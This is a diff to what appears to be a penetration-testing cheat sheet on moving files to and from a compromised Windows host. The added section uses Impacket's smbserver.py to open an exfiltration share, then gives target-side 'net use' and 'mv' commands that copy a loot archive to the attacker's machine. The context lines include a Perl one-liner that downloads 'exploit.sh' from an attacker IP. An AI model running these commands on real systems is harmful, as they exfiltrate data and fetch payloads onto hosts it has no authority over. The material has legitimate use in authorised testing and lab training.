@@ -26,6 +26,19 @@ I got stuck with a borked up reverse shell on a Windows system with no file tran
 
 _\(originally sourced from here:_ [_http://karceh.blogspot.com/2011/06/vbs-download-file-from-internet.html_](http://karceh.blogspot.com/2011/06/vbs-download-file-from-internet.html)_\)_
 
+### Impacket's smbserver.py
+
+As always, the [impacket suite](https://github.com/SecureAuthCorp/impacket) shines. Use `smbserver.py` to open an SMB server on your host for file exfiltration:
+
+```text
+./smbserver.py burmat_exfil ./loot -username burmat -password burmat
+
+## from the target:
+PS C:\> net use Q: \\10.1.1.123\burmat_exfil /user:burmat burmat
+PS C:\> mv .\bh.zip Q:\bh.zip
+PS C:\> net use Q: /delete
+```
+
 ### PERL HTTP File Download
 
 `perl -e 'use File::Fetch; my $ff=File::Fetch->new(uri => "http://10.10.10.11/exploit.sh"); my $file = $ff->fetch() or die $ff->error;'`
